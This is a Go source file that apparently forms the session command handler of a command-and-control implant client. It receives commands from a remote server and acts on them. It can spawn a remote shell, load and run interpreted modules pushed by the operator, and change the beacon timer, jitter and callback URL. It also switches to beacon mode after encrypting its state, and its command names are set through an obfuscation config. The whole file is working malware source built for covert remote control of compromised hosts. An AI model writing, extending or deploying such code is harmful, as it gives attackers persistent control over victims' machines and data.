package session

import (
	"encoding/json"
	"fmt"
	"net"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/interpreter_client"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"strings"
)

func commandHandler(conn net.Conn) error {
	logger.Log("[CommandHandler] ========== COMMAND HANDLER STARTED ==========")
	if conn == nil {
		logger.Error("[CommandHandler] Connection is nil, cannot handle commands.")
		return fmt.Errorf("connection is nil")
	}
	logger.Log("[CommandHandler] Connection validated, entering command loop")

	for {
		// Wait for commands from the server
		logger.Log("[CommandHandler] ---------- WAITING FOR COMMAND ----------")
		logger.Log("[CommandHandler] Calling ReceiveData to get command from server...")
		command, err := protocol.ReceiveData(conn)
		if err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to receive command: %v", err))
			return fmt.Errorf("failed to receive command: %w", err)
		}
		logger.Log(fmt.Sprintf("[CommandHandler] Received command (size: %d bytes): %s", len(command), string(command)))

		// Process the command
		logger.Log("[CommandHandler] Processing command...")
		shouldExit, err := processCommand(conn, string(command))
		if err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to process command: %v", err))
			return fmt.Errorf("failed to process command: %w", err)
		}
		if shouldExit {
			logger.Log("[CommandHandler] Received exit command, terminating command handler")
			return nil
		}
		logger.Log("[CommandHandler] Command processed successfully")
	}
}

func processCommand(conn net.Conn, command string) (bool, error) {
	logger.Log(fmt.Sprintf("[CommandHandler] ===== PROCESSING COMMAND: %s =====", command))

	var cmdName string
	var cmdData string

	logger.Log("[CommandHandler] Parsing command format (JSON vs space-separated)")
	var jsonCmd map[string]json.RawMessage
	if err := json.Unmarshal([]byte(command), &jsonCmd); err == nil && len(jsonCmd) == 1 {
		logger.Log("[CommandHandler] Command parsed as JSON format")
		for k, v := range jsonCmd {
			cmdName = k
			cmdData = string(v)
		}
		// Remove possible surrounding quotes from cmdData if it's a string
		cmdData = strings.Trim(cmdData, "\"")
		logger.Log(fmt.Sprintf("[CommandHandler] Parsed - Name: %s, Data: %s", cmdName, cmdData))
	} else {
		logger.Log("[CommandHandler] Command parsed as space-separated format")
		// Fallback: Parse as space-separated command
		parts := strings.SplitN(command, " ", 2)
		cmdName = parts[0]
		if len(parts) > 1 {
			cmdData = parts[1]
		}
		logger.Log(fmt.Sprintf("[CommandHandler] Parsed - Name: %s, Data: %s", cmdName, cmdData))
	}

	// Handle control commands that affect command loop
	if cmdName == "shutdown" {
		logger.Log("[CommandHandler] Received shutdown command, closing session")
		return true, nil
	}

	if cmdName == "switch_beacon" {
		logger.Log("[CommandHandler] Received switch_beacon command, returning to beacon mode")
		// Encrypt state before switching modes
		logger.Log("[CommandHandler] Encrypting state before mode switch")
		if err := config.EncryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to encrypt state: %v", err))
		}
		return true, nil
	}

	if cmdName == "beacon" {
		logger.Log("[CommandHandler] Received beacon command, switching to beacon mode")
		logger.Log("[CommandHandler] Exiting session and following reconnect pathway")
		// Encrypt state before switching modes
		logger.Log("[CommandHandler] Encrypting state before mode switch")
		if err := config.EncryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to encrypt state: %v", err))
		}
		return true, nil
	}

	if cmdName == "update" {
		logger.Log("[CommandHandler] Received update command, processing configuration changes")
		var response string
		var updateData struct {
			Timer  float64 `json:"timer"`
			Jitter float64 `json:"jitter"`
			URL    string  `json:"url"`
		}
		if err := json.Unmarshal([]byte(cmdData), &updateData); err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to unmarshal update data: %v", err))
			response = "Error: Malformed data for 'update' command: " + err.Error()
		} else {
			logger.Log(fmt.Sprintf("[CommandHandler] Update data - Timer: %f, Jitter: %f, URL: %s", updateData.Timer, updateData.Jitter, updateData.URL))
			config.ConfigMutex.Lock()
			if updateData.Timer > 0 {
				config.Timer = updateData.Timer
				logger.Log(fmt.Sprintf("[CommandHandler] Timer updated to %f", config.Timer))
			}
			if updateData.Jitter >= 0 {
				config.Jitter = updateData.Jitter
				logger.Log(fmt.Sprintf("[CommandHandler] Jitter updated to %f", config.Jitter))
			}
			if updateData.URL != "" {
				config.URL = updateData.URL
				logger.Log(fmt.Sprintf("[CommandHandler] URL updated to %s", config.URL))
			}
			config.ConfigMutex.Unlock()
			response = "Configuration updated successfully"
		}
		// Send response back to server
		logger.Log(fmt.Sprintf("[CommandHandler] Sending response for update command"))
		if err := protocol.SendData(conn, []byte(response)); err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to send response for update command: %v", err))
			return false, fmt.Errorf("failed to send response: %w", err)
		}
		logger.Log("[CommandHandler] Update command processed successfully")
		return false, nil
	}

	var response string

	logger.Log(fmt.Sprintf("[CommandHandler] Routing command: %s", cmdName))
	// Handle built-in and dynamic commands
	switch cmdName {
	case config.Obfuscation.Generic.Commands.Shell.Name:
		logger.Log("[CommandHandler] Received shell command, executing shell handler.")
		commands.ShellHandler(conn)
		logger.Log("[CommandHandler] Shell handler completed")
		return false, nil
	case config.Obfuscation.Generic.Commands.Module.Name:
		logger.Log("[CommandHandler] Received module command, loading dynamic plugin.")
		var moduleData struct {
			Name string `json:"name"`
			Data string `json:"data"`
		}
		logger.Log("[CommandHandler] Unmarshaling module data")
		if err := json.Unmarshal([]byte(cmdData), &moduleData); err != nil {
			logger.Error(fmt.Sprintf("[CommandHandler] Failed to unmarshal module data: %v", err))
			response = "Error: Malformed data for 'module' command: " + err.Error()
		} else {
			logger.Log(fmt.Sprintf("[CommandHandler] Module name: %s, data size: %d bytes", moduleData.Name, len(moduleData.Data)))
			// Load interpreted source code
			logger.Log(fmt.Sprintf("[CommandHandler] Loading dynamic command source for module: %s", moduleData.Name))
			if err := interpreter_client.LoadDynamicCommandSource(moduleData.Name, moduleData.Data); err != nil {
				logger.Error(fmt.Sprintf("[CommandHandler] Failed to load module %s: %v", moduleData.Name, err))
				response = fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err)
			} else {
				logger.Log(fmt.Sprintf("[CommandHandler] Module %s loaded successfully", moduleData.Name))
				response = fmt.Sprintf("Module %s loaded successfully", moduleData.Name)
			}
		}
	default:
		logger.Log(fmt.Sprintf("[CommandHandler] Checking if '%s' is a dynamic command", cmdName))
		if interpreter_client.HasCommand(cmdName) {
			logger.Log(fmt.Sprintf("[CommandHandler] Executing dynamic session command: '%s'", cmdName))
			logger.Log(fmt.Sprintf("[CommandHandler] Command data: %s", cmdData))
			resp, err := interpreter_client.ExecuteFromSession(cmdName, []string{cmdData})
			if err != nil {
				logger.Error(fmt.Sprintf("[CommandHandler] Error executing %s: %v", cmdName, err))
				response = fmt.Sprintf("Error executing %s: %v", cmdName, err)
			} else {
				logger.Log(fmt.Sprintf("[CommandHandler] Command executed successfully, response size: %d bytes", len(resp)))
				response = resp
			}
		} else {
			logger.Log(fmt.Sprintf("[CommandHandler] Unknown session command: %s", cmdName))
			response = fmt.Sprintf("Unknown command: %s", cmdName)
		}
	}

	// Send response back to server
	logger.Log(fmt.Sprintf("[CommandHandler] Sending response (size: %d bytes) for command: %s", len(response), cmdName))
	if err := protocol.SendData(conn, []byte(response)); err != nil {
		logger.Error(fmt.Sprintf("[CommandHandler] Failed to send response for command %s: %v", cmdName, err))
		return false, fmt.Errorf("failed to send response: %w", err)
	}
	logger.Log(fmt.Sprintf("[CommandHandler] Response sent successfully for command: %s", cmdName))
	logger.Log("[CommandHandler] ===== COMMAND PROCESSING COMPLETE =====")
	return false, nil
}
